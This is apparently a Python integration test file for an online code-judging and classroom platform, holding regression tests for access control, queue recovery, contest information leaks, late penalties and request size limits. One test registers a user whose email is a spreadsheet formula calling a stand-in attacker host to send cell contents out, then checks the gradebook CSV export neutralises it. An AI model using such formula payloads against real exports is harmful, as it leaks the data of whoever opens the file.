"""Regressions for the issues an independent review found: each test reproduces the failure
the review described and proves it can no longer happen."""

from __future__ import annotations

import asyncio
import csv
import io
from datetime import UTC, datetime, timedelta
from typing import Any

import httpx
import pytest
import redis.asyncio as aioredis
from sqlalchemy import text
from sqlalchemy.ext.asyncio import create_async_engine

from codejudge.core.contract import Heartbeat
from tests.integration.conftest import JUDGE_TOKEN, STREAM, TEST_REDIS, Stack, make_problem
from tests.integration.test_classrooms import assignment, classroom, student_in
from tests.integration.test_classrooms import submit as class_submit
from tests.integration.test_contests import contestant, make_contest

pytestmark = pytest.mark.asyncio

AC = "print(sum(map(int, input().split())))"


def internal(stack: Stack) -> httpx.AsyncClient:
    return httpx.AsyncClient(
        base_url=stack.api_url,
        headers={"authorization": f"Bearer {JUDGE_TOKEN}", "content-type": "application/json"},
    )


async def sql(stack: Stack, statement: str, **params: Any) -> list[Any]:
    engine = create_async_engine(stack.settings.database_url)
    async with engine.begin() as conn:
        result = await conn.execute(text(statement), params)
        rows = list(result.all()) if result.returns_rows else []
    await engine.dispose()
    return rows


async def test_a_late_heartbeat_never_overwrites_a_verdict(stack: Stack) -> None:
    await make_problem(stack)
    student = await stack.user()
    resp = await student.post(
        "/api/v1/submissions", json={"problem": "sum", "language": "python3", "source": AC}
    )
    done = await stack.verdict(resp.json()["id"], student)
    [(job_id,)] = await sql(stack, "SELECT job_id FROM submissions WHERE id = :i", i=done["id"])
    beat = Heartbeat(job_id=job_id, attempt=1, worker="late", status="running", tests_done=2)
    async with internal(stack) as c:
        assert (
            await c.post("/internal/judge/heartbeat", content=beat.model_dump_json())
        ).status_code == 204
    again = (await student.get(f"/api/v1/submissions/{done['id']}")).json()
    assert again["status"] == "done" and again["verdict"] == "AC"


async def test_a_job_lost_before_the_queue_is_queued_again(stack: Stack) -> None:
    """The row was committed but its job never reached the stream (Redis hiccup)."""
    from codejudge.core.container import Container
    from codejudge.submissions.tasks import requeue_lost

    await make_problem(stack)
    stack.judge.paused.set()
    student = await stack.user()
    resp = await student.post(
        "/api/v1/submissions", json={"problem": "sum", "language": "python3", "source": AC}
    )
    sid = resp.json()["id"]
    r = aioredis.Redis.from_url(TEST_REDIS, decode_responses=True)
    for msg_id, _ in await r.xrange(STREAM):
        await r.xdel(STREAM, msg_id)  # the job is gone
    await r.aclose()
    await sql(
        stack,
        "UPDATE submissions SET created_at = now() - interval '10 minutes' WHERE id = :i",
        i=sid,
    )
    container = Container.build(stack.settings)
    try:
        assert await requeue_lost(container) == 1
        assert await requeue_lost(container) == 0, "a job on the stream is not queued twice"
    finally:
        await container.close()
    stack.judge.paused.clear()
    assert (await stack.verdict(sid, student))["verdict"] == "AC"


async def test_a_demoted_teacher_loses_their_classes(stack: Stack) -> None:
    await make_problem(stack)
    teacher, cls = await classroom(stack)
    a = await assignment(teacher, cls)
    me = (await teacher.get("/api/v1/auth/me")).json()
    await stack.ok("PATCH", f"/api/v1/users/{me['id']}", {"role": "student"})
    # The role change ends the old session; signing in again gives the new role.
    email = me["email"]
    again = httpx.AsyncClient(base_url=stack.api_url, timeout=30, headers={"x-codejudge-csrf": "1"})
    resp = await again.post(
        "/api/v1/auth/login", json={"email": email, "password": "User-Pass-123"}
    )
    again.headers["authorization"] = f"Bearer {resp.json()['session_token']}"
    assert (await again.get(f"/api/v1/assignments/{a['id']}/gradebook")).status_code == 403
    assert (await again.get(f"/api/v1/classes/{cls['id']}/members")).status_code in (403, 404)
    assert (await again.delete(f"/api/v1/classes/{cls['id']}")).status_code == 403
    await again.aclose()


async def test_contestants_do_not_see_solve_counters(stack: Stack) -> None:
    await make_problem(stack, "contest-only", visibility="private")
    contest = await make_contest(stack, "counters", ["contest-only"])
    alice = await contestant(stack, contest, "Alice")
    detail = (await alice.get(f"/api/v1/contests/{contest['slug']}/problems/A")).json()
    assert detail["accepted_count"] == detail["solvers_count"] == detail["submissions_count"] == 0
    assert detail["acceptance"] is None


async def test_an_icpc_contestant_sees_only_the_verdict(stack: Stack) -> None:
    await make_problem(stack, "subtasks", groups=[{"name": "secret", "points": 100}])
    contest = await make_contest(stack, "icpc-oracle", ["subtasks"])
    bob = await contestant(stack, contest, "Bob")
    resp = await bob.post(
        "/api/v1/submissions",
        json={"problem": "subtasks", "language": "python3", "source": AC + " #VERDICT:WA #SCORE:40",
              "context": "contest", "context_id": contest["id"]},
    )  # fmt: skip
    s = await stack.verdict(resp.json()["id"], bob)
    assert s["verdict"] == "WA" and s["score"] == 0 and s["groups"] == [] and s["progress"] is None
    assert all(t["name"].startswith("sample/") for t in s["tests"])


async def test_gradebook_csv_neutralises_every_cell(stack: Stack) -> None:
    await make_problem(stack)
    teacher, cls = await classroom(stack)
    a = await assignment(teacher, cls)
    evil = '=hyperlink("http://evil.example/?"&c3,"open")&"@x.co"'
    resp = await stack.client.post(
        "/api/v1/users",
        json={"email": evil, "name": "Eve", "role": "student", "password": "User-Pass-123"},
    )
    assert resp.status_code == 201, resp.text
    eve = httpx.AsyncClient(base_url=stack.api_url, timeout=30, headers={"x-codejudge-csrf": "1"})
    login = await eve.post("/api/v1/auth/login", json={"email": evil, "password": "User-Pass-123"})
    eve.headers["authorization"] = f"Bearer {login.json()['session_token']}"
    assert (
        await eve.post("/api/v1/classes/join", json={"code": cls["join_code"]})
    ).status_code == 200
    await class_submit(stack, eve, a, AC)
    body = (await teacher.get(f"/api/v1/assignments/{a['id']}/gradebook.csv")).text
    cells = [cell for row in csv.reader(io.StringIO(body)) for cell in row]
    assert not any(cell[:1] in ("=", "+", "-", "@") for cell in cells), cells
    await eve.aclose()


async def test_an_extension_granted_later_lifts_the_late_penalty(stack: Stack) -> None:
    await make_problem(stack)
    teacher, cls = await classroom(stack)
    a = await assignment(teacher, cls, policy="penalty")
    sam = await student_in(stack, cls, "Sam")
    me = (await sam.get("/api/v1/auth/me")).json()
    await class_submit(stack, sam, a, AC)
    # Move the due time into the past: the submission is now late.
    await sql(
        stack, "UPDATE assignments SET due_at = now() - interval '1 hour' WHERE id = :i", i=a["id"]
    )
    await sql(
        stack,
        "UPDATE submissions SET created_at = now() - interval '30 minutes' WHERE user_id = :u",
        u=me["id"],
    )
    book = (await teacher.get(f"/api/v1/assignments/{a['id']}/gradebook")).json()
    late_row = next(r for r in book["rows"] if r["name"] == "Sam")
    assert late_row["cells"][0]["late"] is True
    due = (datetime.now(UTC) + timedelta(days=1)).isoformat()
    resp = await teacher.put(
        f"/api/v1/assignments/{a['id']}/extensions", json={"user_id": me["id"], "due_at": due}
    )
    assert resp.status_code in (200, 201, 204), resp.text
    book = (await teacher.get(f"/api/v1/assignments/{a['id']}/gradebook")).json()
    row = next(r for r in book["rows"] if r["name"] == "Sam")
    assert row["cells"][0]["late"] is False and row["total"] > late_row["total"]


async def test_counters_follow_a_rejudge_that_changes_the_verdict(stack: Stack) -> None:
    p = await make_problem(stack)
    student = await stack.user()
    resp = await student.post(
        "/api/v1/submissions", json={"problem": "sum", "language": "python3", "source": AC}
    )
    sid = resp.json()["id"]
    await stack.verdict(sid, student)
    assert (await stack.ok("GET", "/api/v1/problems/sum"))["accepted_count"] == 1
    # The same program now fails (say, the tests were fixed): a rejudge must take it back.
    await sql(
        stack, "UPDATE submissions SET source = source || ' #VERDICT:WA' WHERE id = :i", i=sid
    )
    await stack.ok("POST", "/api/v1/submissions/rejudge", {"ids": [sid]})
    assert (await stack.verdict(sid))["verdict"] == "WA"
    for _ in range(50):
        row = await stack.ok("GET", "/api/v1/problems/sum")
        if row["accepted_count"] == 0:
            break
        await asyncio.sleep(0.1)
    assert row["accepted_count"] == 0 and row["solvers_count"] == 0
    del p


async def test_a_forged_or_student_token_keeps_the_small_body_limit(stack: Stack) -> None:
    p = await stack.ok("POST", "/api/v1/problems", {"slug": "big-two", "title": "Big"}, status=201)
    tests = [
        {"name": "sample/1", "input": "1 1\n", "answer": "2\n"},
        {"name": "secret/1", "input": "1 " * 1_500_000, "answer": "3\n"},
    ]
    student = await stack.user()
    for headers in ({"authorization": "Bearer forged"}, dict(student.headers)):
        async with httpx.AsyncClient(base_url=stack.api_url, timeout=30, headers=headers) as c:
            try:
                resp = await c.post(f"/api/v1/problems/{p['id']}/versions", json={"tests": tests})
                assert resp.status_code == 413
            except httpx.TransportError:
                pass  # refused while still sending
    async with httpx.AsyncClient(
        base_url=stack.api_url, timeout=30, headers={"authorization": "Bearer wrong"}
    ) as c:
        try:
            resp = await c.post("/internal/judge/results", content=b"x" * 3_000_000)
            assert resp.status_code == 413
        except httpx.TransportError:
            pass
